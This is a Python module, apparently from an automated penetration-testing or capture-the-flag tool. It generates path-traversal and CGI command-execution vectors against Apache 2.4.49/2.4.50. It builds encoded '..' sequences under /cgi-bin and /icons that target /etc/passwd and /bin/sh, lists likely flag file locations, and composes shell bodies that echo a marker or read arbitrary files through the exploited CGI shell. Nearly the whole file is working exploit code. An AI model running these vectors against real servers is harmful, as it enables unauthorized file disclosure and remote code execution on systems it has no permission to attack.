from __future__ import annotations

import re
from dataclasses import dataclass
from typing import Literal

ApacheTraversalMode = Literal["direct", "cgi"]

APACHE_CANONICAL_READ_PATH = "/etc/passwd"

_DOUBLE_ENCODED_FAMILIES = (
    ("percent_chars", ".%25%32%65"),
    ("double_encoded_dot", ".%252e"),
    ("raw_percent_chars", ".%%32%65"),
    ("percent_pair", "%25%32%65%25%32%65"),
    ("raw_percent_pair", "%%32%65%%32%65"),
)
_SINGLE_ENCODED_FAMILIES = (
    ("single_encoded_dot", ".%2e"),
    ("single_encoded_pair", "%2e%2e"),
)
_CGI_PRIMARY_FAMILY_COUNT = 3
_CGI_READ_BYTE_LIMIT = 8_192
_KNOWN_PROOF_PATHS = (
    "/FLAG.txt",
    "/flag.txt",
    "/FLAG",
    "/flag",
    "/proof.txt",
    "/tmp/flag",  # noqa: S108 - intentional remote proof-path candidate.
    "/tmp/FLAG",  # noqa: S108 - intentional remote proof-path candidate.
    "/app/flag",
    "/app/FLAG.txt",
    "/workspace/flag",
    "/workspace/FLAG.txt",
)
_SAFE_ABSOLUTE_PATH = re.compile(r"/[A-Za-z0-9._/-]{1,239}")
_UNSAFE_MARKER_ERROR = "Apache CGI marker contains unsafe characters"
_UNSAFE_PATH_ERROR = "Apache CGI read path is unsafe"


@dataclass(frozen=True)
class ApacheTraversalVector:
    family: str
    mode: ApacheTraversalMode
    alias: str
    depth: int
    path_template: str

    def path_for(self, absolute_path: str = APACHE_CANONICAL_READ_PATH) -> str:
        if not _valid_absolute_path(absolute_path):
            raise ValueError(_UNSAFE_PATH_ERROR)
        if self.mode == "cgi":
            return self.path_template
        return self.path_template.replace("{payload}", absolute_path.lstrip("/"))


def apache_traversal_vectors(server_banner: str) -> tuple[ApacheTraversalVector, ...]:
    """Return the bounded breadth-before-depth Apache traversal matrix."""
    lowered = server_banner.lower()
    if "2.4.49" in lowered:
        families = _SINGLE_ENCODED_FAMILIES + _DOUBLE_ENCODED_FAMILIES
    else:
        families = _DOUBLE_ENCODED_FAMILIES + _SINGLE_ENCODED_FAMILIES

    vectors: list[ApacheTraversalVector] = []
    for depth in (4, 5):
        for family, component in families:
            traversal = "/" + "/".join(component for _item in range(depth))
            vectors.extend(
                (
                    ApacheTraversalVector(
                        family=family,
                        mode="direct",
                        alias="/cgi-bin",
                        depth=depth,
                        path_template="/cgi-bin" + traversal + "/{payload}",
                    ),
                    ApacheTraversalVector(
                        family=family,
                        mode="cgi",
                        alias="/cgi-bin",
                        depth=depth,
                        path_template="/cgi-bin" + traversal + "/bin/sh",
                    ),
                    ApacheTraversalVector(
                        family=family,
                        mode="direct",
                        alias="/icons",
                        depth=depth,
                        path_template="/icons" + traversal + "/{payload}",
                    ),
                )
            )
    return tuple(vectors)


def apache_known_proof_paths() -> tuple[str, ...]:
    return _KNOWN_PROOF_PATHS


def apache_cgi_vectors(server_banner: str) -> tuple[ApacheTraversalVector, ...]:
    """Return a low-noise CGI-only matrix that reaches both depths early."""
    families = _ordered_families(server_banner)
    primary = families[:_CGI_PRIMARY_FAMILY_COUNT]
    fallback = families[_CGI_PRIMARY_FAMILY_COUNT:]
    vectors: list[ApacheTraversalVector] = []
    for group in (primary, fallback):
        for depth in (4, 5):
            for family, component in group:
                traversal = "/" + "/".join(component for _item in range(depth))
                vectors.append(
                    ApacheTraversalVector(
                        family=family,
                        mode="cgi",
                        alias="/cgi-bin",
                        depth=depth,
                        path_template="/cgi-bin" + traversal + "/bin/sh",
                    )
                )
    return tuple(vectors)


def apache_direct_vectors(server_banner: str) -> tuple[ApacheTraversalVector, ...]:
    """Return traversal file-read vectors without CGI execution candidates."""
    return tuple(
        vector for vector in apache_traversal_vectors(server_banner) if vector.mode == "direct"
    )


def apache_cgi_marker_body(marker: str) -> str:
    if not re.fullmatch(r"[A-Za-z0-9_:-]{1,120}", marker):
        raise ValueError(_UNSAFE_MARKER_ERROR)
    midpoint = len(marker) // 2
    left = marker[:midpoint]
    right = marker[midpoint:]
    return "echo; printf '%s%s' '" + left + "' '" + right + "'"


def apache_cgi_read_body(path: str) -> str:
    if not _valid_absolute_path(path):
        raise ValueError(_UNSAFE_PATH_ERROR)
    return (
        "echo; [ -f '"
        + path
        + "' ] && head -c "
        + str(_CGI_READ_BYTE_LIMIT)
        + " -- '"
        + path
        + "' 2>/dev/null"
    )


def _ordered_families(server_banner: str) -> tuple[tuple[str, str], ...]:
    if "2.4.49" in server_banner.lower():
        return _SINGLE_ENCODED_FAMILIES + _DOUBLE_ENCODED_FAMILIES
    return _DOUBLE_ENCODED_FAMILIES + _SINGLE_ENCODED_FAMILIES


def _valid_absolute_path(path: str) -> bool:
    if _SAFE_ABSOLUTE_PATH.fullmatch(path) is None:
        return False
    if path.endswith("/") or "//" in path:
        return False
    return all(component not in {"", ".", ".."} for component in path.split("/")[1:])
